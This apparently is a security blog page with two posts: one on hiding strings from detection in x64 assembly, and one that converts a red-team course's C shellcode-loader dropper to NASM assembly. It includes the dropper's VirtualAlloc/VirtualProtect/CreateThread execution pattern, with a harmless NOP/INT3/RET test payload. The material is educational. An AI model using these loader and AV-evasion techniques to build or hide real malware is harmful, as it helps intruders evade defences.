<span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="no">i</span><span class="err">+</span><span class="mi">8</span><span class="p">*</span><span class="no">j</span><span class="p">],</span><span class="w"> </span><span class="err">%</span><span class="mi">1</span>
<span class="w">        </span><span class="err">%</span><span class="nf">assign</span><span class="w"> </span><span class="no">i</span><span class="w"> </span><span class="no">i</span><span class="err">+</span><span class="mi">1</span>
<span class="w">        </span><span class="err">%</span><span class="nf">rotate</span><span class="w"> </span><span class="mi">1</span>

<span class="w">        </span><span class="err">%</span><span class="nf">if</span><span class="w"> </span><span class="no">i</span><span class="w"> </span><span class="err">&gt;=</span><span class="w"> </span><span class="mi">8</span>
<span class="w">            </span><span class="err">%</span><span class="nf">assign</span><span class="w"> </span><span class="no">j</span><span class="w"> </span><span class="no">j</span><span class="err">+</span><span class="mi">1</span>
<span class="w">            </span><span class="err">%</span><span class="nf">assign</span><span class="w"> </span><span class="no">i</span><span class="w"> </span><span class="mi">0</span>
<span class="w">        </span><span class="err">%</span><span class="nf">endif</span>
<span class="w">    </span><span class="err">%</span><span class="nf">endrep</span>
<span class="err">%</span><span class="nf">endmacro</span>
</code></pre></div>

<p>What the macro does is that it loops through each character and places it into the correct position on the stack.</p>
<blockquote>
<p><strong>Important note:</strong> When reserving space on the stack, make sure it is in multiples of 16! This is because the stack has a 16-bit boundary for stack alignment! </p>
<p>For example, if our string has 10 characters, we only need to reserve 16 bytes. If our character is 20 characters long, we'd have to reserve 32 bytes.</p>
</blockquote>
<p>This macro can then be called like this:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">        </span><span class="c1">; Reserve space for the string on the stack</span>
<span class="w">    </span><span class="nf">addstr2stack</span><span class="w"> </span><span class="err">&quot;</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">o</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">t</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">p</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">a</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">&quot;</span><span class="no">d</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0x0</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">]</span>
<span class="w">    </span><span class="na">...</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">        </span><span class="c1">; After use, release the space</span>
</code></pre></div>

<p>Here is what the result of the macro looks like in the debugger:</p>
<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-1-05" src="../images/string-anti-virus-evasion-in-x64-assembly-part-1-05.png" /></p>
<p>For the full source code visit the repo <a href="https://github.com/accidentalrebel/string-anti-virus-evasion-x64-assembly">on Github</a>. Updates and fixes to the code will be pushed there.</p>
<hr />
<p>So there you have it, we were able to successfully hide strings by changing the way how the data is declared and placed in memory. If you think about it, the technique is very simple.</p>
<p>However, we've only seen it used against the <code>strings</code> command. Can it evade an actual anti-virus? The answer is probably no. In my next post I'll be talking about API call obfuscation that would help hide functions like <code>ShellExecute</code>.</p>
<p><strong>Edit: <a href="string-av-evasion-in-x64-assembly-part-1">Part 2 here</a></strong></p>
<blockquote>
<p>. Also, for any questions or comments, feel free to reach out to me on <a href="https://twitter.com/accidentalrebel">Twitter</a> or <a href="https://www.linkedin.com/in/juan-karlo-licudine/">LinkedIn</a>.</p>
</blockquote>
        </div>

        <div class="tags">
            <a href="../tag/evasion.html" class="tag">evasion</a>
            <a href="../tag/assembly.html" class="tag">assembly</a>
            <a href="../tag/av.html" class="tag">av</a>
        </div>
    </article>
    <article class="post-item">
        <header class="article-header">
            <h2 class="post-title">
                <a href="../converting-a-malware-dropper-to-x64-assembly.html">Converting a malware dropper to x64 assembly</a>
            </h2>
            <div class="article-meta">
                <time datetime="2022-07-03T09:18:00+08:00">Sun 03 July 2022</time>
                <span>•</span>
                <a href="../category/misc.html">misc</a>
            </div>
        </header>

        <div class="article-content">
            <p>In this post I'll be listing down lessons I learned while converting a simple malware dropper written in C to x64 assembly. </p>
<p>I started this project as a way to deepen my understanding of assembly so I could be better in malware development and reverse engineering (And also because I love coding in assembly and would always find an excuse to use it).</p>
<h2 id="what-to-expect">What to expect</h2>
<p>I'll be going through sections of the C file and show the how it can be written accordingly in x64 Windows assembly. Take note, however, that the conversion is not one-to-one, meaning there are other ways of writing it. What I did was to structure the assembly code so that you can easily compare it with the C code while making sure that the end result will be the same.</p>
<p>I won't be covering the basics of assembly because <a href="https://sonictk.github.io/asm_tutorial/">this post</a> does a better job of doing that. And as for the assembler, I'll be using <a href="https://www.nasm.us/">nasm</a> because this is the one I'm most familiar with.</p>
<blockquote>
<p><strong>Disclaimer:</strong> I am not an expert in any of these topics. I'm just someone who learned things and wish to share it to others. If I'm wrong about anything feel free to point it out. </p>
</blockquote>
<h2 id="credits">Credits</h2>
<p>The malware dropper that we'll be converting is made by <a href="https://twitter.com/sektor7net">@reenz0h</a>. I found it in <a href="https://github.com/kymb0/Malware_learns">kymb0's repository</a> and I learned that it's a part of the <a href="https://institute.sektor7.net/">Red Team Operator course by Sektor7</a>. I've read good things about the course and I plan to take it in the future, you should check it out too.</p>
<h2 id="the-dropper">The dropper</h2>
<p>Here's the malware dropper that we'll be converting:</p>
<div class="codehilite"><pre><span></span><code><span class="cm">/*</span>

<span class="cm"> Red Team Operator course code template</span>
<span class="cm"> storing payload in .data section</span>

<span class="cm"> author: reenz0h (twitter: @sektor7net)</span>

<span class="cm">*/</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>

<span class="c1">// 4 byte payload</span>
<span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">payload</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="mh">0x90</span><span class="p">,</span><span class="w">       </span><span class="c1">// NOP</span>
<span class="w">    </span><span class="mh">0x90</span><span class="p">,</span><span class="w">       </span><span class="c1">// NOP</span>
<span class="w">    </span><span class="mh">0xcc</span><span class="p">,</span><span class="w">       </span><span class="c1">// INT3</span>
<span class="w">    </span><span class="mh">0xc3</span><span class="w">        </span><span class="c1">// RET</span>
<span class="p">};</span>
<span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">payload_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">exec_mem</span><span class="p">;</span>
<span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">rv</span><span class="p">;</span>
<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">th</span><span class="p">;</span>
<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">oldprotect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Allocate a memory buffer for payload.</span>
<span class="w">    </span><span class="n">exec_mem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">payload_len</span><span class="p">,</span><span class="w"> </span><span class="n">MEM_COMMIT</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MEM_RESERVE</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_READWRITE</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%-20s : 0x%-016p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;payload addr&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">payload</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%-20s : 0x%-016p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;exec_mem addr&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Copy payload to new buffer</span>
<span class="w">    </span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span><span class="w"> </span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="n">payload_len</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Make new buffer as executable</span>
<span class="w">    </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span><span class="w"> </span><span class="n">payload_len</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Hit me!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">getchar</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// If all good, run the payload</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">rv</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">th</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="w"> </span><span class="n">exec_mem</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">            </span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>Here is what the code does:</p>
<ul>
<li>Allocates memory buffer with size <code>payload_len</code></li>
<li>Copies <code>payload</code> to the buffer</li>
<li>The buffer's memory protection is changed to <code>PAGE_EXECUTE_READ</code> which allows for code execution</li>
<li>A thread is created that runs the payload, which runs indefinitely</li>
</ul>
<p>It doesn't seem that the program is doing much when run. All we see are the payload and exec_mem addresses for debugging purposes and nothing much else.</p>
<p><img alt="converting-a-malware-dropper-to-x64-assembly-01" src="../images/converting-a-malware-dropper-to-x64-assembly-01.png" /></p>
<p>The most interesting parts with this code will be seen under a debugger, which I'll go through later in this post.</p>
<h2 id="including-external-functions">Including external functions</h2>
<p>In C, if we want to to use a Windows API function, we need to include the necessary header files and make sure to supply required library names via the linker, like so:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
</code></pre></div>

<p>x64 assembly does not use header files so the process is done differently. First, the necessary ".lib" files should be supplied to the linker:</p>
<div class="codehilite"><pre><span></span><code>link<span class="w"> </span>dropper_data.obj<span class="w"> </span>/subsystem:console<span class="w"> </span>/out:dropper_data.exe<span class="w"> </span>kernel32.lib<span class="w"> </span>msvcrt.lib
</code></pre></div>

<p>Next, every external function that we'll be using in our code needs to be specified as shown below:</p>
<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.text</span>
<span class="w">    </span><span class="nf">global</span><span class="w"> </span><span class="no">main</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ExitProcess</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">printf</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">VirtualAlloc</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">VirtualProtect</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">RtlMoveMemory</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">getchar</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">CreateThread</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">WaitForSingleObject</span>
</code></pre></div>

<p>Note that the <code>extern</code> keyword in assembly is different in C. Externs in C are used for <em>exporting</em> symbols while they are used for <em>importing</em> symbols in Assembly. <code>global</code> is the one used for exporting.</p>
<p>Once the symbols are properly exported then that is when the functions can be used with the <code>call</code> operand.</p>
<h2 id="the-entrypoint">The entrypoint</h2>
<p>There needs to be an entry point so that the operating system knows where to jump to start our program. We do this in C by declaring a <code>main</code> function:</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="p">...</span>
<span class="p">}</span>
</code></pre></div>

<p>In assembly, we declare the entry point with <code>global main</code> (As seen in the previous section) and also supply the <code>main:</code> label within the code. This is where execution will jump to.</p>
<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.text</span>
<span class="w">   </span><span class="nf">global</span><span class="w"> </span><span class="no">main</span>
<span class="w">   </span><span class="na">...</span>
<span class="w">   </span><span class="na">...</span>

<span class="nl">main:</span>
<span class="w">   </span><span class="nf">push</span><span class="w">    </span><span class="no">rbp</span>
<span class="w">   </span><span class="na">...</span>
<span class="w">   </span><span class="na">...</span>
</code></pre></div>

<h2 id="the-payload">The payload</h2>
<p>The payload in this example is a simple shellcode made for testing purposes. This can be changed to any shellcode of any length as long as <code>payload_len</code> reflects the new size of the shellcode.</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// 4 byte payload</span>
<span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">payload</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="mh">0x90</span><span class="p">,</span><span class="w">       </span><span class="c1">// NOP</span>
<span class="w">    </span><span class="mh">0x90</span><span class="p">,</span><span class="w">       </span><span class="c1">// NOP</span>
<span class="w">    </span><span class="mh">0xcc</span><span class="p">,</span><span class="w">       </span><span class="c1">// INT3</span>
<span class="w">    </span><span class="mh">0xc3</span><span class="w">        </span><span class="c1">// RET</span>
<span class="p">};</span>
<span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">payload_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span>
</code></pre></div>

<p>In assembly, initializing data is done in <code>segment .data</code>.</p>
<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.data</span>
<span class="w">    </span><span class="na">...</span>
<span class="w">    </span><span class="na">...</span>
<span class="w">    </span><span class="c1">;; 4 byte payload</span>
<span class="w">    </span><span class="nf">payload</span><span class="w">         </span><span class="no">db</span><span class="w">  </span><span class="mi">0x90</span><span class="p">,</span><span class="w"> </span><span class="mi">0x90</span><span class="p">,</span><span class="w"> </span><span class="mi">0xCC</span><span class="p">,</span><span class="w"> </span><span class="mi">0xC3</span>
<span class="w">    </span><span class="nf">payload_len</span><span class="w">     </span><span class="no">db</span><span class="w">  </span><span class="mi">4</span>
</code></pre></div>

<p>We can then check the above data laid out in the <code>.data</code> memory segment using a debugger:</p>
<p><img alt="converting-a-malware-dropper-to-x64-assembly-02" src="../images/converting-a-malware-dropper-to-x64-assembly-02.png" /></p>
<p><img alt="converting-a-malware-dropper-to-x64-assembly-03" src="../images/converting-a-malware-dropper-to-x64-assembly-03.png" /></p>
<p>You may notice that our shellcode is not at the start of the <code>.data</code> segment because there are other data that was declared prior to our payload. This is important to note as the order we declare the data will be the order they will appear in memory.</p>
<h2 id="initialized-data">Initialized data</h2>
<p>All data in assembly needs to be declared and initialized before it can be used:</p>
<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.data</span>
<span class="w">    </span><span class="nf">msg_hello</span><span class="w">       </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">Hello</span><span class="w"> </span><span class="no">world</span><span class="p">!</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
<span class="w">    </span><span class="nf">msg_exec_addr</span><span class="w">   </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">exec_mem</span><span class="w"> </span><span class="no">addr</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
<span class="w">    </span><span class="nf">msg_pload_addr</span><span class="w">  </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">payload</span><span class="w"> </span><span class="no">addr</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">   </span>
<span class="w">    </span><span class="no">msg_format</span><span class="w">      </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;%</span><span class="mi">-20</span><span class="no">s</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="no">x</span><span class="err">%</span><span class="mi">-016</span><span class="no">p</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
<span class="w">    </span><span class="nf">msg_hit_me</span><span class="w">      </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">Hit</span><span class="w"> </span><span class="no">me</span><span class="p">!</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>

<span class="w">    </span><span class="na">...</span>
<span class="w">    </span><span class="na">...</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_format</span><span class="p">]</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_pload_addr</span><span class="p">]</span>
<span class="w">    </span><span class="na">...</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">printf</span>
<span class="w">    </span><span class="na">...</span>
</code></pre></div>

<p>This is optional in C as you can pass data (like a string) directly to a function without adding it to a variable:</p>
<div class="codehilite"><pre><span></span><code><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%-20s : 0x%-016p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;payload addr&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">payload</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&quot;%-20s : 0x%-016p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;exec_mem addr&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">);</span>
</code></pre></div>

<p>However, under the hood, the C compiler actually places these data on the <code>.data</code> segment for you automatically. If you were to compile and run the C program you would see that the strings are in the <code>.data</code> segment.</p>
<h2 id="uninitialized-data">Uninitialized data</h2>
<p>Memory of certain sizes can be reserved so that it can be used later in a program. These unitialized data is declared not in a <code>.data</code> segment but in a <code>.bss</code> segment <a href="https://en.wikipedia.org/wiki/.bss">(more here)</a>.</p>
<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.bss</span><span class="w">    </span>
<span class="w">    </span><span class="no">exec_mem</span><span class="w">    </span><span class="no">resb</span><span class="w">    </span><span class="mi">8</span>
<span class="w">    </span><span class="nf">old_protect</span><span class="w"> </span><span class="no">resb</span><span class="w">    </span><span class="mi">8</span>
</code></pre></div>

<p>Nasm provides specific "pseudo-instructions" for declaring unitialized data like <code>resb</code> (reserve byte), <code>resw</code> (reserve word), and so on. </p>
<p>Alternatively, this can be written like this:</p>
<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.bss</span><span class="w">    </span>
<span class="w">    </span><span class="no">exec_mem</span><span class="w">        </span><span class="no">db</span><span class="w">  </span><span class="mi">8</span><span class="w"> </span><span class="no">dup</span><span class="w"> </span><span class="p">(</span><span class="err">?</span><span class="p">)</span><span class="w">   </span><span class="c1">; Reserve 8 bytes of ? null value</span>
<span class="w">    </span><span class="nf">old_protect</span><span class="w">     </span><span class="no">dq</span><span class="w">  </span><span class="mi">1</span><span class="w">           </span><span class="c1">; DQ = QWORD</span>
</code></pre></div>

<p>It would still work but NASM doesn't like it and would throw a warning.</p>
<div class="codehilite"><pre><span></span><code>dropper_data.asm:18:<span class="w"> </span>warning:<span class="w"> </span>attempt<span class="w"> </span>to<span class="w"> </span>initialize<span class="w"> </span>memory<span class="w"> </span><span class="k">in</span><span class="w"> </span>BSS<span class="w"> </span>section<span class="w"> </span><span class="sb">`</span>.bss<span class="err">&#39;</span>:<span class="w"> </span>ignored<span class="w"> </span><span class="o">[</span>-w+other<span class="o">]</span>
</code></pre></div>

<p>The memory for the uninitialized data won't be reserved until the program is loaded. Once it is, we can see the reserved memory in the <code>.data</code> segment. </p>
<p>Any data we move to the previously unitialized data can now be seen from a debugger. See below for an example:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">],</span><span class="w"> </span><span class="no">rax</span><span class="w">  </span><span class="c1">; Move &quot;000001F96E100000&quot; to memory</span>
</code></pre></div>

<p><img alt="converting-a-malware-dropper-to-x64-assembly-04" src="../images/converting-a-malware-dropper-to-x64-assembly-04.png" /></p>
<h2 id="shadow-spaces">Shadow Spaces</h2>
<p>When calling a function in x64 Windows assembly, programmers must keep in mind to reserve a "shadow space" before doing a <code>call</code> to an external function that is in another language like C or C++. For example:</p>
<div class="codehilite"><pre><span></span><code>    sub     rsp, 32 
    call    getchar
    add     rsp, 32
</code></pre></div>

<p>But what is a shadow space? <a href="https://stackoverflow.com/questions/30190132/what-is-the-shadow-space-in-x64-assembly">Here</a> is a quick explanation:</p>
<blockquote>
<p>The shadow space is the mandatory 32 bytes (4x8 bytes) you must reserve for the called procedure. It just means you must provide 32 bytes on the stack before calling.</p>
<p>It can be used by compilers to leave a copy of the register values on the stack for later inspection in the debugger. It is meant to be used to make debugging x64 easier.</p>
</blockquote>
<p>So in the code above, <code>sub rsp, 32</code> reserves the shadow space before <code>getchar</code> is called. The space on the stack is highlighted in the image below.</p>
<p><img alt="converting-a-malware-dropper-to-x64-assembly-05" src="../images/converting-a-malware-dropper-to-x64-assembly-05.png" /></p>
<p><code>call getchar</code> then executes and the "shadow space" gets filled.</p>
<p><img alt="converting-a-malware-dropper-to-x64-assembly-06" src="../images/converting-a-malware-dropper-to-x64-assembly-06.png" /></p>
<p>As the caller, we really do not care about the data that gets placed in the shadows space. So after calling the functions we do <code>add rsp, 32</code> to reclaim the shadow space.</p>
<p>You'll find out the importance of properly reserving and releasing a shadow space especially if you are relying on the stack for saving local variables. Here is a segment of the code where I found out first-hand the importance of handling the shadow space.</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rax</span><span class="w">                </span><span class="c1">;; I need rax for later so I pushed it on the stack</span>

<span class="w">    </span><span class="nf">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_hit_me</span><span class="p">]</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">printf</span><span class="w">             </span><span class="c1">;; printf was expecting a shadow space so it just wrote onto the stack, overwriting the value from RAX before</span>

<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">getchar</span><span class="w">            </span><span class="c1">;; getchar did the same too</span>

<span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span><span class="w">                    </span><span class="c1">;; The value saved by rax is overwritten</span>
</code></pre></div>

<p>Simply handling the shadow space avoided this problem:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rax</span>

<span class="w">    </span><span class="nf">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_hit_me</span><span class="p">]</span>
<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is reserved</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">printf</span><span class="w">             </span><span class="c1">;; printf can write to the stack without overwriting data that I need</span>
<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is released</span>

<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is reserved</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">getchar</span><span class="w">            </span><span class="c1">;; same goes with getchar</span>
<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is released</span>

<span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span><span class="w">                    </span><span class="c1">;; I got the correct value from rax that I pushed</span>
</code></pre></div>

<p>The above code can be further optimized by only releasing the shadow space after both call to <code>printf</code> and <code>getchar</code>, as shown below:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rax</span>

<span class="w">    </span><span class="nf">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_hit_me</span><span class="p">]</span>
<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is reserved</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">printf</span><span class="w">             </span><span class="c1">;; printf can write to the stack without overwriting data that I need</span>

<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">getchar</span><span class="w">            </span><span class="c1">;; same goes with getchar</span>
<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is released</span>

<span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span><span class="w">                    </span><span class="c1">;; I got the correct value from rax that I pushed</span>
</code></pre></div>

<p>However, there might come a time when the code will change and you might forget to re-add the code that releases and reserves the shadow space. This may lead to hard-to-find stack related problems. To avoid this, just make it a habit to reserve and release the shadow space every time an external function is called.</p>
<p>As an alternative, you can use a routine that could reserve and release the shadow space automatically like the one below:</p>
<div class="codehilite"><pre><span></span><code><span class="nl">shadow_call:</span>
<span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rbx</span><span class="w">         </span><span class="c1">; Get the return address pointer in a non-volitile register</span>
